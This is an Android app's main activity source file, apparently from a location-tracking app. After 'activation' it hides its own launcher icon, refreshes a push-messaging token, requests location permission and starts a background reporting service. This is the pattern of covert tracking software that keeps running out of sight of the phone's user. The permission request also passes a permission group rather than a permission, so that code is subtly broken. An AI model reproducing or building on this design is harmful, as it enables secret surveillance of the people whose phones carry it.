package com.geolocation;

import android.*;
import android.Manifest;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;

import com.geolocation.fcm.IDService;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        findViewById(R.id.btn_activate).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                PackageManager pkg = getPackageManager();
                pkg.setComponentEnabledSetting(new ComponentName(MainActivity.this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

                (new IDService()).onTokenRefresh();
                finish();
            }
        });

        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if(ContextCompat.checkSelfPermission(this, Manifest.permission_group.LOCATION) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission_group.LOCATION}, 1);
            }
        }

        Intent i = new Intent(this, ReportService.class);
        startService(i);
    }
}
